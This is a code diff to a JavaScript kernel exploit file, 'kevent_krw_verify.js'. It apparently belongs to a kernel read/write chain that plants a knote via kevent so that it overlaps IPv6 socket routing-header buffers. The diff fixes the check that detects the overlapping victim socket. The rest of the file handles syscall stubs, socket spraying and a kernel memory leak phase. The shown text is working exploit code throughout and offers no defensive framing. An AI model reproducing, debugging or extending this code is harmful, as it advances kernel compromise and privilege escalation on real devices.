@@ -1,4 +1,4 @@
-// kevent_krw_verify.js — stub validation, full build
+// kevent_krw_verify.js — correct knote overlap check
 import { int64 } from "./int64.js";
 import { HX1400_TABLES } from "./hx_tables.js";
 
@@ -247,7 +247,6 @@ function findStubRaw(snum) {
   return null;
 }
 
-// Validates if an address actually holds a syscall stub (48 C7 C0 ...)
 function isValidStub(addr) {
   if (!addr || addr === 0n) return false;
   const p = ctx().p;
@@ -283,7 +282,6 @@ function synthStub(targetNum) {
 }
 
 function ensureStubs() {
-  // 1. Check the pre-populated stubs from the harness
   let missing = [];
   for (const k in NUM) {
     const n = NUM[k];
@@ -294,7 +292,6 @@ function ensureStubs() {
     }
   }
 
-  // 2. Scan for missing stubs
   if (missing.length > 0) {
     log("NATIVES-SCAN", "missing/bad stubs: " + missing.join(","));
     for (const k of missing) {
@@ -307,13 +304,11 @@ function ensureStubs() {
     log("NATIVES-SCANCOUNT", "saw " + SCAN_SEEN + " stubs in 512KB");
   }
 
-  // 3. Re-check
   missing = [];
   for (const k in NUM) {
     if (!ctx().stubAddr.has(NUM[k])) missing.push(k);
   }
 
-  // 4. Synthesize if still missing
   if (missing.length > 0) {
     for (const k of missing) {
       const r = synthStub(NUM[k]);
@@ -322,7 +317,6 @@ function ensureStubs() {
     }
   }
 
-  // 5. Final hard fail
   const still = [];
   for (const k in NUM) {
     if (!ctx().stubAddr.has(NUM[k]) || !isValidStub(num(ctx().stubAddr.get(NUM[k])))) still.push(k);
@@ -392,7 +386,10 @@ function phase2Leak(rootKq, fds) {
       const pageInt = Number(page & 0xffffffffn) | 0;
       tries++;
       zeroBuf(cl);
-      cl.dv.setUint32(0, dce >>> 0, true); cl.dv.setInt16(8, -18, true); cl.dv.setInt16(10, 1, true); cl.dv.setUint32(16, 90, true);
+      cl.dv.setUint32(0, dce >>> 0, true); 
+      cl.dv.setInt16(8, -18, true); 
+      cl.dv.setInt16(10, 1, true); 
+      cl.dv.setUint32(16, 90, true);
       let rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
       log("KV-PLANT", "cand=" + vi + " dce=" + dce + " page=" + h16(page) + " rc=" + rc);
       let joined = 0;
@@ -401,13 +398,24 @@ function phase2Leak(rootKq, fds) {
           if (j === vi || fds[j] === -1) continue;
           zeroBuf(rdb); lenp.dv.setUint32(0, RTH_LEN, true); lenp.dv.setUint32(4, 0, true);
           if (scn("getsockopt", fds[j], IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) continue;
-          const v8 = rdb.dv.getInt32(8, true);
+          
+          // FIXED CHECK: knote overwrote the socket with filter=-18, flags=1
+          const v8 = rdb.dv.getInt16(8, true);
+          const v10 = rdb.dv.getInt16(10, true);
           const v12 = rdb.dv.getUint32(12, true) >>> 0;
-          if (v8 === pageInt && v12 === 0) { joined++; if (target < 0) { target = j; targetFd = fds[j]; } log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined); }
-          else if ((v8 >>> 0) === TPL_LO && v12 === TPL_HI) {} else { rearm(fds[j], tpl); }
+          
+          if (v8 === -18 && v10 === 1) {
+            joined++; 
+            if (target < 0) { target = j; targetFd = fds[j]; } 
+            log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined);
+          } else if ((rdb.dv.getInt32(8, true) >>> 0) === TPL_LO && v12 === TPL_HI) {
+            // untouched
+          } else { 
+            rearm(fds[j], tpl); 
+          }
         }
       }
-      if (target >= 0 && joined === 1) {
+      if (target >= 0 && joined >= 1) {
         zeroBuf(cl); cl.dv.setUint32(0, dce >>> 0, true); cl.dv.setInt16(8, -18, true); cl.dv.setInt16(10, 2, true);
         rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
         if (rc !== 0) { target = -1; targetFd = -1; log("KV-HELD-FAIL", "rc=" + rc); }
@@ -440,7 +448,7 @@ export async function runKevent(c) {
     HX.setKbase(STATE.kbase);
   }
 
-  ensureStubs(); // hard fails if any stub is invalid
+  ensureStubs();
 
   const burn = [];
   for (let i = 0; i < 200; i++) { const fd = scn("socket", AF_INET, SOCK_STREAM, 0); if (fd >= 0) burn.push(fd); }
